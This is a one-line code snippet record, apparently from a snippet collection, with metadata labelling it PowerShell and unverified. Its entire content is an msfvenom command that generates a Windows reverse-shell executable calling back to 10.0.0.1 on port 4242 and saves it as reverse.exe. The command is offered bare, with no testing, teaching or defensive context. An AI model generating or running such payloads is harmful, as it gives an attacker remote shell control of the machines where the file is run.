---
id: bf1360f4-f411-44c8-8552-074ec7d5cec1
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:24.842608+00:00'
updated_at: '2023-04-10T20:25:25.582968+00:00'
---

# Code Snippet bf1360f4

**Language**: Powershell

```powershell
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
```
